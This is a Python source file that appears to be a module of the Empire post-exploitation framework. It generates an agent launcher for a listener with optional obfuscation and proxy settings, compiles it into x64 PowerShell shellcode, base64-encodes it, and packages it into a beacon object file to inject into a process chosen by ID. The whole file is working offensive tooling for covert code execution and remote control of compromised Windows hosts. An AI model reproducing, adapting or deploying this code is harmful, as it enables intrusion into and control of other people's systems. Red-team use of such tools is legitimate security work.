import base64

from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleExecutionException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        params["Architecture"] = "x64"
        listener_name = params["Listener"]
        pid = params["pid"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscation_command = params["ObfuscateCommand"]
        language = params["Language"]
        launcher_obfuscation = params["Obfuscate"]

        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language=language,
            encode=False,
            obfuscate=launcher_obfuscation,
            obfuscation_command=launcher_obfuscation_command,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
        )

        shellcode, err = main_menu.stagergenv2.generate_powershell_shellcode(
            launcher, arch="x64", dot_net_version="net40"
        )
        if err:
            raise ModuleExecutionException("Failed to generate shellcode")

        encoded_shellcode = base64.b64encode(shellcode).decode("utf-8")

        params_dict = {
            "Architecture": "x64",
            "Shellcode": encoded_shellcode,
            "ProcessID": pid,
        }

        return main_menu.modulesv2.generate_script_bof(
            module=module,
            params=params_dict,
            obfuscate=obfuscate,
        )
